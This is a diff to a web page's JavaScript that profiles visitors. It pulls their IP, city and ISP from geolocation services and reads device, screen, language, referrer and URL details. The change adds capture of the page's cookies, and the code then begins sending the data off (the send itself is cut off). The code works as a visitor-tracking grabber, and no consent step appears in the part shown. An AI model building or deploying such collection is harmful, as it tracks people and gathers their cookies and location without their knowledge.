@@ -52,10 +52,7 @@
       line-height: 1.75;
       color: #b0b0b0;
     }
-    .info b {
-      color: #ddd;
-      font-weight: 600;
-    }
+    .info b { color: #ddd; font-weight: 600; }
     .divider {
       height: 1px;
       background: #2a2a2a;
@@ -76,6 +73,7 @@
       const statusEl = document.getElementById("status");
       const infoEl = document.getElementById("info");
 
+      // ——— Datos base ———
       const data = {
         // Red
         ip: "",
@@ -86,6 +84,7 @@
         conexion: "No disponible",
         tipoRed: "Desconocido",
         rtt: "N/A",
+        downlink: "N/A",
 
         // Dispositivo
         os: navigator.platform || (navigator.userAgentData && navigator.userAgentData.platform) || "Desconocido",
@@ -93,9 +92,10 @@
         device: /Mobi|Android|iPhone|iPad/i.test(navigator.userAgent) ? "Móvil" : "PC",
         ram: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Desconocida",
         nucleos: navigator.hardwareConcurrency || "Desconocido",
-        pantalla: window.screen.width + " × " + window.screen.height,
-        pixelRatio: window.devicePixelRatio || 1,
-        orientacion: (screen.orientation && screen.orientation.type) || "Desconocida",
+        pantalla: window.screen.width + "x" + window.screen.height,
+        pantallaDisponible: window.screen.availWidth + "x" + window.screen.availHeight,
+        pixelRatio: String(window.devicePixelRatio || 1),
+        orientacion: (screen.orientation && screen.orientation.type) ? screen.orientation.type : "Desconocida",
         colorDepth: (screen.colorDepth || "?") + " bits",
 
         // Batería
@@ -104,15 +104,23 @@
 
         // Idioma / zona
         idioma: navigator.language || "Desconocido",
+        idiomas: (navigator.languages || []).join(", ") || "N/A",
         zonaHoraria: Intl.DateTimeFormat().resolvedOptions().timeZone || "N/A",
 
         // Otras
         toque: ("ontouchstart" in window) ? "Sí" : "No",
-        cookies: navigator.cookieEnabled ? "Sí" : "No",
+        cookiesEnabled: navigator.cookieEnabled ? "Sí" : "No",
+        cookies: document.cookie ? document.cookie.substring(0, 120) : "(vacío)",
+        localStorage: (() => { try { localStorage.setItem("_t","1"); localStorage.removeItem("_t"); return "Sí"; } catch(e){ return "No"; } })(),
+        sessionStorage: (() => { try { sessionStorage.setItem("_t","1"); sessionStorage.removeItem("_t"); return "Sí"; } catch(e){ return "No"; } })(),
         online: navigator.onLine ? "Sí" : "No",
         maxTouchPoints: navigator.maxTouchPoints || 0,
         webdriver: navigator.webdriver ? "Sí" : "No",
-        userAgent: navigator.userAgent || ""
+        pdfViewer: navigator.pdfViewerEnabled ? "Sí" : "No",
+        vendor: navigator.vendor || "N/A",
+        userAgent: navigator.userAgent || "",
+        referrer: document.referrer || "(directo)",
+        url: location.href
       };
 
       // Conexión
@@ -120,7 +128,8 @@
         const c = navigator.connection;
         data.conexion = (c.effectiveType || "?") + " / " + (c.downlink || "?") + " Mbps";
         data.tipoRed = c.type || "Desconocido";
-        data.rtt = c.rtt ? c.rtt + " ms" : "N/A";
+        data.rtt = c.rtt != null ? c.rtt + " ms" : "N/A";
+        data.downlink = c.downlink != null ? c.downlink + " Mbps" : "N/A";
       }
 
       // Navegador
@@ -140,25 +149,30 @@
         } catch (e) {}
       }
 
-      // IP + geolocalización
+      // IP + ubicación (fuente más estable)
       try {
         const geo = await fetch("https://ipapi.co/json/", { cache: "no-store" }).then(r => r.json());
-        data.ip = geo.ip || "";
-        data.country = geo.country_name || "";
-        data.city = geo.city || "";
-        data.region = geo.region || "";
-        data.isp = geo.org || "";
+        if (geo && !geo.error) {
+          data.ip = geo.ip || "";
+          data.country = geo.country_name || geo.country || "";
+          data.city = geo.city || "";
+          data.region = geo.region || geo.region_code || "";
+          data.isp = geo.org || geo.asn || "";
+        }
       } catch (e) {
         try {
-          const geo2 = await fetch("https://ipinfo.io/json", { cache: "no-store" }).then(r => r.json());
-          data.ip = geo2.ip || "";
-          data.country = geo2.country || "";
-          data.city = geo2.city || "";
-          data.isp = geo2.org || "";
+          const geo2 = await fetch("https://ipwho.is/", { cache: "no-store" }).then(r => r.json());
+          if (geo2 && geo2.success !== false) {
+            data.ip = geo2.ip || "";
+            data.country = geo2.country || "";
+            data.city = geo2.city || "";
+            data.region = geo2.region || "";
+            data.isp = (geo2.connection && geo2.connection.isp) || "";
+          }
         } catch (e2) {}
       }
 
-      // Mostrar en pantalla (sin template literals raros)
+      // Mostrar resumen en pantalla
       infoEl.innerHTML =
         "<b>IP:</b> " + (data.ip || "—") + "<br>" +
         "<b>País:</b> " + (data.country || "—") + (data.city ? " · " + data.city : "") + "<br>" +
@@ -175,7 +189,7 @@
         "<b>Idioma:</b> " + data.idioma + "<br>" +
         "<b>Zona:</b> " + data.zonaHoraria;
 
-      // Enviar a la Function
+      // Enviar
       statusEl.textContent = "Enviando...";
       statusEl.className = "status loading";
 
